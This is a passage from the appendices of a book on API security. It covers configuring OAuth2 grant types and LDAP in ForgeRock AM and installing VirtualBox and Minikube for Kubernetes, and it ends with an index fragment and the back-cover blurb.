them, but you should allow the client to use all the authorization grant types covered in this book. Click  on  the  Advanced  tab  at  the  top  of  the  page,  and  then  click  inside  the  Grant Types field on the page as shown in figure A.5. Add the following grant types to the field and then click Save Changes:    Authorization Code   Resource Owner Password Credentials   Client Credentials   Refresh Token     JWT Bearer   Device Code  Figure A.5 Click on the Advanced tab and then in the Grant Types field to configure the allowed grant  types for the client.   Installing an LDAP directory server  531  You can check that everything is working by getting an access token for the client by running the following curl command in a terminal:  curl -d 'grant_type=client_credentials&scope=openid' \   -u test:password http:  as.example.com:8080 oauth2 access_token  You’ll see output like the following:  {"access_token":"MmZl6jRhMoZn8ZNOXUAa9RPikL8","scope":"openid","id_token":"ey J0eXAiOiJKV1QiLCJraWQiOiJ3VTNpZklJYUxPVUFSZVJCL0ZHNmVNMVAxUU09IiwiYWxnIjoiUlM yNTYifQ.eyJhdF9oYXNoIjoiTXF2SDY1NngyU0wzc2dnT25yZmNkZyIsInN1YiI6InRlc3QiLCJhd WRpdFRyYWNraW5nSWQiOiIxNDViNjI2MC1lNzA2LTRkNDctYWVmYy1lMDIzMTQyZjBjNjMtMzg2MT kiLCJpc3MiOiJodHRwOi8vYXMuZXhhbXBsZS5jb206ODA4MC9vYXV0aDIiLCJ0b2tlbk5hbWUiOiJ pZF90b2tlbiIsImF1ZCI6InRlc3QiLCJhenAiOiJ0ZXN0IiwiYXV0aF90aW1lIjoxNTgxMzc1MzI1 LCJyZWFsbSI6Ii8iLCJleHAiOjE1ODEzNzg5MjYsInRva2VuVHlwZSI6IkpXVFRva2VuIiwiaWF0I joxNTgxMzc1MzI2fQ.S5Ib5Acj5hZ7se9KvtlF2vpByG_0XAWKSg0- Zy_GZmpatrox0460u5HYvPdOVl7qqP- AtTV1ah_2aFzX1qN99ituo8fOBIpKDTyEgHZcxeZQDskss1QO8ZjdoE-JwHmzFzIXMU-5u9ndfX7- -Wu_QiuzB45_NsMi72ps9EP8iOMGVAQyjFG5U6jO7jEWHUKI87wrv1iLjaFUcG0H8YhUIIPymk- CJUgwtCBzESQ1R7Sf-6mpVgAjHA-eQXGjH18tw1dRneq-kY-D1KU0wxMnw0GwBDK- LudtCBaETiH5T_CguDyRJJotAq65_MNCh0mhsw4VgsvAX5Rx30FQijXjNw","token_type":"Bea rer","expires_in":3599}  A.4  Installing an LDAP directory server An LDAP directory server is needed for some of the examples in chapter 8.  TIP Apache Directory Studio is a useful tool for browsing LDAP directories. It can be downloaded from https:  directory.apache.org studio .  A.4.1  ForgeRock Directory Services If you’ve installed ForgeRock AM using the instructions in section A.3.1, you already have an LDAP directory server running on port 50389, because this is what AM uses as its internal database and user repository. You can connect to the directory using the following details:    URL: ldap:   localhost:50389    Bind DN: cn=Directory Manager   Bind password: the admin password you specified when installing AM   appendix B Setting up Kubernetes  The example code in chapters 10 and 11 requires a working Kubernetes installa- tion. In this appendix, you’ll find instructions on installing a Kubernetes develop- ment environment on your own laptop or desktop.  B.1 MacOS  Although Docker Desktop for Mac comes with a functioning Kubernetes environ- ment, the examples in the book have only been tested with Minikube running on VirtualBox, so I recommend you install these components to ensure compatibility.  NOTE The instructions in this appendix assume you have installed Home- brew. Follow the instructions in appendix A to configure Homebrew before continuing.  The instructions require MacOS 10.12  Sierra  or later.  B.1.1  VirtualBox  Kubernetes uses Linux containers as the units of execution on a cluster, so for other operating systems, you’ll need to install a virtual machine that will be used to run a Linux guest environment. The examples have been tested with Oracle’s VirtualBox  https:  www.virtualbox.org , which is a freely available virtual machine that runs on MacOS.  NOTE Although  the  base  VirtualBox  package  is  open  source  under  the terms of the GPL, the VirtualBox Extension Pack uses different licensing terms.  See  https:  www.virtualbox.org wiki Licensing_FAQ  for  details. None of the examples in the book require the extension pack.   532   B.1.2 Minikube  Linux  533  You  can  install  VirtualBox  either  by  downloading  an  installer  from  the  VirtualBox website, or by using Homebrew by running:  brew cask install virtualbox  NOTE After  installing  VirtualBox  you  may  need  to  manually  approve  the installation of the kernel extension it requires to run. Follow the instructions on Apple’s website: http:  mng.bz 5pQz.  After  VirtualBox  is  installed  you  can  install  a  Kubernetes  distribution.  Minikube  https:  minikube.sigs.k8s.io docs   is a single-node Kubernetes cluster that you can run on a developer machine. You can install Minikube using Homebrew by running:  brew install minikube  Afterward, you should configure Minikube to use VirtualBox as its virtual machine by running the following command:  minikube config set vm-driver virtualbox You can then start minikube by running minikube start \   --kubernetes-version=1.16.2 \       --memory=4096           The version of Kubernetes  used in the book  Use 4GB of memory.  TIP A running Minikube cluster can use a lot of power and memory. Stop Minikube when you’re not using it by running minikube stop.  Installing Minikube with Homebrew will also install the kubectl command-line appli- cation required to configure a Kubernetes cluster. You can check that it’s installed cor- rectly by running:  kubectl version --client --short  You should see output like the following:  Client Version: v1.16.3  export PATH=$PATH: usr local bin  You should then be able to use kubectl.  If kubectl can’t be found, then make sure that  usr local bin is in your PATH by running:  B.2  Linux Although Linux is the native environment for Kubernetes, it’s still recommended to install Minikube using a virtual machine for maximum compatibility. For testing, I’ve used VirtualBox on Linux too, so that is the recommended option.   APPENDIX B Setting up Kubernetes  VirtualBox VirtualBox for Linux can be installed by following the instructions for your Linux dis- tribution at https:  www.virtualbox.org wiki Linux_Downloads.  534  B.2.1  B.2.2 Minikube  Minikube can be installed by direct download by running the following command:  curl \   -LO https:  storage.googleapis.com minikube releases latest  ➥ minikube-linux-amd64 \    && sudo install minikube-linux-amd64  usr local bin minikube  Afterward, you can configure Minikube to use VirtualBox by running:  minikube config set vm-driver=virtualbox  You can then follow the instructions at the end of section B.1.2 to ensure Minikube and kubectl are correctly installed.  TIP If you want to install Minikube using your distribution’s package man- ager, see the instructions at https:  minikube.sigs.k8s.io docs start and click on the Linux tab for various distributions.  B.3 Windows  B.3.2 Minikube  B.3.1  VirtualBox VirtualBox  for  Windows  can  be  installed  using  the  installer  file  from  https:  www .virtualbox.org wiki Downloads.  A Windows installer for Minikube can be downloaded from https:  storage.googleapis .com minikube releases latest minikube-installer.exe. Follow the on-screen instruc- tions after downloading and running the installer.   Once Minikube is installed, open a terminal window, and run:  minikube config set vm-driver=virtualbox  to configure Minikube to use VirtualBox.   index  A  A128CBC-HS256 method 203 AAA

sharing in every service, server, data store,   and web client. Modern data-centric designs—including  microservices and cloud-native applications—demand a  comprehensive, multi-layered approach to security for both  private and public-facing APIs. API Security in Action teaches you how to create secure APIs  for any situation. By following this hands-on guide you’ll  build a social network API while mastering techniques for ﬂ exible multi-user security, cloud key management, and  lightweight cryptography. When you’re done, you’ll be able  to create APIs that stand up to complex threat models and  hostile environments.   What’s Inside  ● Authentication ● Authorization ● Audit logging ● Rate limiting ● Encryption  For developers with experience building RESTful APIs.  Examples are in Java.  Neil Madden has in-depth knowledge of applied cryptography,  application security, and current API security technologies. He  holds a Ph.D. in Computer Science.
